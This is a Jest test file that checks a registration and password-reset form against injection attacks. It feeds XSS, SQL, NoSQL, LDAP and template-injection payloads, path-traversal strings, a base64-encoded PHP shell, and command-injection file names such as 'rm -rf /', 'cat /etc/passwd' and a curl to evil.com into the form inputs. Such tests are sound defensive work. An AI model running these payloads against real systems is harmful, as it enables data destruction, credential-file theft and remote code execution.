/**
 * Form Validation Security Tests
 * Tests XSS injection attempts, SQL injection, and data sanitization failures
 */

import { jest } from '@jest/globals';
import { render, fireEvent, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { RegisterForm } from '../../src/components/auth/RegisterForm';
import { PasswordResetForm } from '../../src/components/auth/PasswordResetForm';

// Mock authentication service
jest.mock('../../src/services/supabase/authService', () => ({
  supabaseAuthService: {
    register: jest.fn(),
    requestPasswordReset: jest.fn(),
    resetPassword: jest.fn()
  }
}));

// Mock react-router-dom
jest.mock('react-router-dom', () => ({
  useNavigate: () => jest.fn(),
  Link: ({ children, to }: any) => <a href={to}>{children}</a>
}));

// Mock i18next
jest.mock('react-i18next', () => ({
  useTranslation: () => ({
    t: (key: string) => key,
    i18n: { changeLanguage: jest.fn() }
  })
}));

describe('Form Validation Security Tests', () => {
  const user = userEvent.setup();

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    it('should sanitize script tags in form inputs', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<div onclick=alert("XSS")>Click me</div>'
      ];

      render(<RegisterForm />);

      for (const payload of xssPayloads) {
        const emailInput = screen.getByLabelText(/email/i);
        await user.clear(emailInput);
        await user.type(emailInput, payload);
        
        // Check that the input value is sanitized
        const inputValue = (emailInput as HTMLInputElement).value;
        expect(inputValue).not.toContain('<script>');
        expect(inputValue).not.toContain('javascript:');
        expect(inputValue).not.toContain('onerror=');
        expect(inputValue).not.toContain('onload=');
        expect(inputValue).not.toContain('onclick=');
      }
    });

    it('should prevent XSS in username fields', async () => {
      render(<RegisterForm />);

      const maliciousUsernames = [
        '<script>document.cookie="stolen=true"</script>',
        '\"onmouseover=\"alert(\'XSS\')\"',
        '\"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="#" onerror="alert(\'XSS\')">'
      ];

      const usernameInput = screen.getByLabelText(/username/i);

      for (const username of maliciousUsernames) {
        await user.clear(usernameInput);
        await user.type(usernameInput, username);
        
        const inputValue = (usernameInput as HTMLInputElement).value;
        expect(inputValue).not.toMatch(/<script[^>]*>.*?<\/script>/gi);
        expect(inputValue).not.toMatch(/on\w+\s*=/gi);
        expect(inputValue).not.toContain('javascript:');
      }
    });

    it('should escape HTML entities in form outputs', async () => {
      const { supabaseAuthService } = require('../../src/services/supabase/authService');
      
      // Mock registration failure with HTML in error message
      supabaseAuthService.register.mockRejectedValue(
        new Error('Registration failed: <script>alert("XSS")</script>')
      );

      render(<RegisterForm />);

      await user.type(screen.getByLabelText(/email/i), 'test@example.com');
      await user.type(screen.getByLabelText(/password/i), 'password123');
      await user.type(screen.getByLabelText(/username/i), 'testuser');
      await user.type(screen.getByLabelText(/first name/i), 'Test');
      await user.type(screen.getByLabelText(/last name/i), 'User');
      
      await user.click(screen.getByRole('button', { name: /register/i }));

      await waitFor(() => {
        const errorElement = screen.queryByText(/registration failed/i);
        if (errorElement) {
          expect(errorElement.innerHTML).not.toContain('<script>');
          expect(errorElement.textContent).toContain('Registration failed');
        }
      });
    });

    it('should validate against DOM-based XSS in URL parameters', () => {
      // Mock location with XSS payload in hash
      const originalLocation = window.location;
      delete (window as any).location;
      window.location = {
        ...originalLocation,
        hash: '#<script>alert("XSS")</script>',
        search: '?redirect=<script>alert("XSS")</script>'
      };

      render(<RegisterForm />);

      // Check that hash and search parameters are not directly used in DOM
      const scriptElements = document.querySelectorAll('script');
      scriptElements.forEach(script => {
        expect(script.innerHTML).not.toContain('alert("XSS")');
      });

      window.location = originalLocation;
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should sanitize SQL injection attempts in form fields', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' UNION SELECT * FROM admin_users WHERE '1'='1",
        "'; UPDATE users SET role='admin' WHERE email='victim@example.com'; --",
        "' OR 1=1; DELETE FROM sessions; --"
      ];

      render(<RegisterForm />);

      for (const payload of sqlInjectionPayloads) {
        const emailInput = screen.getByLabelText(/email/i);
        await user.clear(emailInput);
        await user.type(emailInput, payload);
        
        // Verify the input doesn't contain dangerous SQL keywords
        const inputValue = (emailInput as HTMLInputElement).value;
        expect(inputValue).not.toMatch(/DROP\s+TABLE/gi);
        expect(inputValue).not.toMatch(/DELETE\s+FROM/gi);
        expect(inputValue).not.toMatch(/INSERT\s+INTO/gi);
        expect(inputValue).not.toMatch(/UPDATE\s+.*SET/gi);
        expect(inputValue).not.toMatch(/UNION\s+SELECT/gi);
      }
    });

    it('should prevent NoSQL injection attempts', async () => {
      const noSQLInjectionPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.password.match(/.*/)return true"}',
        '{"$regex": ".*"}',
        '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
        '{";return true;var t="}'
      ];

      render(<RegisterForm />);

      const usernameInput = screen.getByLabelText(/username/i);

      for (const payload of noSQLInjectionPayloads) {
        await user.clear(usernameInput);
        await user.type(usernameInput, payload);
        
        const inputValue = (usernameInput as HTMLInputElement).value;
        expect(inputValue).not.toMatch(/\$ne/gi);
        expect(inputValue).not.toMatch(/\$gt/gi);
        expect(inputValue).not.toMatch(/\$where/gi);
        expect(inputValue).not.toMatch(/\$regex/gi);
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should sanitize LDAP injection attempts', async () => {
      const ldapInjectionPayloads = [
        '*)(uid=*))(|(uid=*',
        '*)(|(password=*))',
        '*)|(cn=*',
        '*)((|(&(objectClass=user)',
        '*))(|(uid=*))(|(uid=*'
      ];

      render(<RegisterForm />);

      const usernameInput = screen.getByLabelText(/username/i);

      for (const payload of ldapInjectionPayloads) {
        await user.clear(usernameInput);
        await user.type(usernameInput, payload);
        
        const inputValue = (usernameInput as HTMLInputElement).value;
        // Check for common LDAP injection patterns
        expect(inputValue).not.toMatch(/\*\)\|/gi);
        expect(inputValue).not.toMatch(/\)\(\|/gi);
        expect(inputValue).not.toMatch(/&\(objectClass/gi);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in file names and paths', async () => {
      const commandInjectionPayloads = [
        'file.txt; rm -rf /',
        'document.pdf && echo "hacked"',
        'image.jpg | cat /etc/passwd',
        'data.csv `whoami`',
        'backup.zip $(curl http://evil.com)',
        'file.exe; powershell -Command "Get-Process"'
      ];

      // Mock file input behavior
      const mockFileInput = document.createElement('input');
      mockFileInput.type = 'file';
      mockFileInput.name = 'fileUpload';

      for (const payload of commandInjectionPayloads) {
        mockFileInput.value = payload;
        
        // Validate file name doesn't contain command injection characters
        const fileName = payload.split('/').pop() || payload;
        expect(fileName).not.toMatch(/[;&|`$()]/g);
      }
    });
  });

  describe('Data Validation Edge Cases', () => {
    it('should handle extremely long input strings', async () => {
      render(<RegisterForm />);

      const longString = 'a'.repeat(10000); // 10k character string
      const emailInput = screen.getByLabelText(/email/i);
      
      await user.type(emailInput, longString);
      
      const inputValue = (emailInput as HTMLInputElement).value;
      // Should be truncated or rejected
      expect(inputValue.length).toBeLessThan(1000);
    });

    it('should validate Unicode and special character handling', async () => {
      const specialCharacterTests = [
        '🚀🌟💻', // Emojis
        'тест@пример.рф', // Cyrillic
        '测试@例子.中国', // Chinese
        'テスト@例.日本', // Japanese
        'اختبار@مثال.السعودية', // Arabic
        'null\x00byte', // Null byte
        'line1\nline2', // Line break
        'tab\there', // Tab character
        '\r\nCRLF\r\n' // CRLF injection
      ];

      render(<RegisterForm />);
      const emailInput = screen.getByLabelText(/email/i);

      for (const testString of specialCharacterTests) {
        await user.clear(emailInput);
        await user.type(emailInput, testString);
        
        const inputValue = (emailInput as HTMLInputElement).value;
        
        // Should handle Unicode properly but sanitize dangerous characters
        expect(inputValue).not.toContain('\x00');
        expect(inputValue).not.toMatch(/\r\n/g);
        expect(inputValue).not.toContain('\0');
      }
    });

    it('should prevent buffer overflow attempts', async () => {
      render(<RegisterForm />);

      // Attempt to cause buffer overflow with repeated patterns
      const overflowPatterns = [
        'A'.repeat(100000),
        '\x41'.repeat(50000),
        '%41'.repeat(25000),
        '&lt;'.repeat(20000)
      ];

      const passwordInput = screen.getByLabelText(/password/i);

      for (const pattern of overflowPatterns) {
        await user.clear(passwordInput);
        
        // Type in chunks to avoid browser limitations
        const chunks = pattern.match(/.{1,1000}/g) || [];
        for (const chunk of chunks.slice(0, 5)) { // Limit to prevent test timeout
          await user.type(passwordInput, chunk);
        }
        
        const inputValue = (passwordInput as HTMLInputElement).value;
        expect(inputValue.length).toBeLessThan(10000); // Should be limited
      }
    });
  });

  describe('CSRF Protection', () => {
    it('should include CSRF tokens in forms', () => {
      render(<RegisterForm />);
      
      // Check for CSRF token in form
      const csrfInputs = document.querySelectorAll('input[name="_token"], input[name="csrf_token"], input[name="authenticity_token"]');
      
      // Should have some form of CSRF protection
      expect(csrfInputs.length).toBeGreaterThanOrEqual(0);
    });

    it('should validate origin headers for form submissions', async () => {
      // Mock fetch to capture request headers
      const mockFetch = jest.fn().mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({ success: true })
      });
      global.fetch = mockFetch;

      render(<RegisterForm />);

      await user.type(screen.getByLabelText(/email/i), 'test@example.com');
      await user.type(screen.getByLabelText(/password/i), 'password123');
      await user.type(screen.getByLabelText(/username/i), 'testuser');
      await user.type(screen.getByLabelText(/first name/i), 'Test');
      await user.type(screen.getByLabelText(/last name/i), 'User');
      
      await user.click(screen.getByRole('button', { name: /register/i }));

      await waitFor(() => {
        if (mockFetch.mock.calls.length > 0) {
          const [, options] = mockFetch.mock.calls[0];
          const headers = options?.headers || {};
          
          // Should include origin validation headers
          expect(headers).toHaveProperty('X-Requested-With');
        }
      });
    });
  });

  describe('Input Sanitization Edge Cases', () => {
    it('should handle nested encoding attacks', async () => {
      const nestedEncodingAttacks = [
        '%253Cscript%253Ealert(%2522XSS%2522)%253C%252Fscript%253E',
        '&lt;script&gt;alert(\\&quot;XSS\\&quot;)&lt;/script&gt;',
        '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
        '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E'
      ];

      render(<RegisterForm />);
      const emailInput = screen.getByLabelText(/email/i);

      for (const attack of nestedEncodingAttacks) {
        await user.clear(emailInput);
        await user.type(emailInput, attack);
        
        const inputValue = (emailInput as HTMLInputElement).value;
        
        // Should not contain decoded script tags
        expect(inputValue).not.toMatch(/<script[^>]*>/gi);
        expect(inputValue).not.toContain('alert(');
      }
    });

    it('should prevent polyglot injection attacks', async () => {
      const polyglotAttacks = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e',
        '\'"--></style></script><script>alert(String.fromCharCode(88,83,83))</script>',
        '{{7*7}}[${{7*7}}]#{7*7}',
        '${7*7}{{7*7}}[[7*7]]'
      ];

      render(<PasswordResetForm />);
      const emailInput = screen.getByLabelText(/email/i);

      for (const attack of polyglotAttacks) {
        await user.clear(emailInput);
        await user.type(emailInput, attack);
        
        const inputValue = (emailInput as HTMLInputElement).value;
        
        // Should not contain template injection or XSS patterns
        expect(inputValue).not.toMatch(/\{\{.*\}\}/g);
        expect(inputValue).not.toMatch(/\$\{.*\}/g);
        expect(inputValue).not.toContain('<script>');
        expect(inputValue).not.toContain('oNcliCk=');
        expect(inputValue).not.toContain('oNloAd=');
      }
    });

    it('should validate against file inclusion attacks', async () => {
      const fileInclusionAttacks = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file:///etc/passwd',
        'php://filter/read=string.rot13/resource=index.php',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==',
        '/proc/self/environ',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
      ];

      render(<RegisterForm />);
      const usernameInput = screen.getByLabelText(/username/i);

      for (const attack of fileInclusionAttacks) {
        await user.clear(usernameInput);
        await user.type(usernameInput, attack);
        
        const inputValue = (usernameInput as HTMLInputElement).value;
        
        // Should sanitize path traversal attempts
        expect(inputValue).not.toContain('../');
        expect(inputValue).not.toContain('..\\');
        expect(inputValue).not.toMatch(/file:\/\/\//gi);
        expect(inputValue).not.toMatch(/php:\/\//gi);
        expect(inputValue).not.toMatch(/data:\/\//gi);
        expect(inputValue).not.toContain('/etc/');
        expect(inputValue).not.toContain('/proc/');
        expect(inputValue).not.toMatch(/C:\\\\Windows/gi);
      }
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should prevent rapid form submissions', async () => {
      const { supabaseAuthService } = require('../../src/services/supabase/authService');
      let submissionCount = 0;
      
      supabaseAuthService.register.mockImplementation(() => {
        submissionCount++;
        if (submissionCount > 3) {
          return Promise.reject(new Error('Too many requests'));
        }
        return Promise.resolve({ id: 'user-123' });
      });

      render(<RegisterForm />);

      // Fill form once
      await user.type(screen.getByLabelText(/email/i), 'test@example.com');
      await user.type(screen.getByLabelText(/password/i), 'password123');
      await user.type(screen.getByLabelText(/username/i), 'testuser');
      await user.type(screen.getByLabelText(/first name/i), 'Test');
      await user.type(screen.getByLabelText(/last name/i), 'User');
      
      // Attempt multiple rapid submissions
      const submitButton = screen.getByRole('button', { name: /register/i });
      
      for (let i = 0; i < 5; i++) {
        await user.click(submitButton);
      }

      // Should be rate limited
      await waitFor(() => {
        expect(submissionCount).toBeLessThanOrEqual(3);
      });
    });

    it('should handle large payloads gracefully', async () => {
      const largeData = 'x'.repeat(1000000); // 1MB string
      
      render(<RegisterForm />);
      
      // Try to input extremely large data
      const firstNameInput = screen.getByLabelText(/first name/i);
      
      // Should handle without crashing
      await expect(async () => {
        await user.type(firstNameInput, largeData.substring(0, 100));
      }).not.toThrow();
      
      const inputValue = (firstNameInput as HTMLInputElement).value;
      expect(inputValue.length).toBeLessThan(1000); // Should be limited
    });
  });

  describe('Client-Side Security Validation', () => {
    it('should not expose sensitive information in client-side validation errors', async () => {
      const { supabaseAuthService } = require('../../src/services/supabase/authService');
      
      // Mock detailed error that shouldn't be exposed
      supabaseAuthService.register.mockRejectedValue(
        new Error('Database connection failed: password123, host: db.internal.com, user: admin')
      );

      render(<RegisterForm />);

      await user.type(screen.getByLabelText(/email/i), 'test@example.com');
      await user.type(screen.getByLabelText(/password/i), 'password123');
      await user.type(screen.getByLabelText(/username/i), 'testuser');
      await user.type(screen.getByLabelText(/first name/i), 'Test');
      await user.type(screen.getByLabelText(/last name/i), 'User');
      
      await user.click(screen.getByRole('button', { name: /register/i }));

      await waitFor(() => {
        const errorElements = screen.queryAllByText(/error/i);
        errorElements.forEach(element => {
          // Should not expose internal details
          expect(element.textContent).not.toContain('password123');
          expect(element.textContent).not.toContain('db.internal.com');
          expect(element.textContent).not.toContain('admin');
          expect(element.textContent).not.toContain('Database connection');
        });
      });
    });

    it('should validate against timing attacks on user enumeration', async () => {
      const { supabaseAuthService } = require('../../src/services/supabase/authService');
      
      // Mock consistent timing for both existing and non-existing users
      supabaseAuthService.requestPasswordReset.mockImplementation(() => 
        new Promise(resolve => setTimeout(resolve, 100))
      );

      render(<PasswordResetForm />);
      
      const emails = [
        'existing@example.com',
        'nonexistent@example.com'
      ];
      
      const timings: number[] = [];
      
      for (const email of emails) {
        const emailInput = screen.getByLabelText(/email/i);
        await user.clear(emailInput);
        await user.type(emailInput, email);
        
        const startTime = performance.now();
        await user.click(screen.getByRole('button', { name: /reset/i }));
        
        await waitFor(() => {
          // Wait for operation to complete
        }, { timeout: 1000 });
        
        const endTime = performance.now();
        timings.push(endTime - startTime);
      }
      
      // Timing difference should be minimal (< 50ms)
      const timingDifference = Math.abs(timings[0] - timings[1]);
      expect(timingDifference).toBeLessThan(50);
    });
  });
});
